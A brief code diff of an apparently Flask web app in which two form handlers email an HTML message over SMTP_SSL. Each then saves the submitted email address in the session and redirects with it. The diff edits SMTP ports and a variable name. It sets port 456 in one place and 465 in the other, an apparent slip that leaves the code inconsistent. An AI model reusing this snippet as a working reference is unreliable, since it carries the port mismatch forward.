@@ -210,7 +210,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("guide-level.com", 6040) as server:
+        with smtplib.SMTP_SSL("guide-level.com", 456) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -250,8 +250,8 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("guide-level.com", 6040) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
         return redirect(url_for('lasmo', web=email))
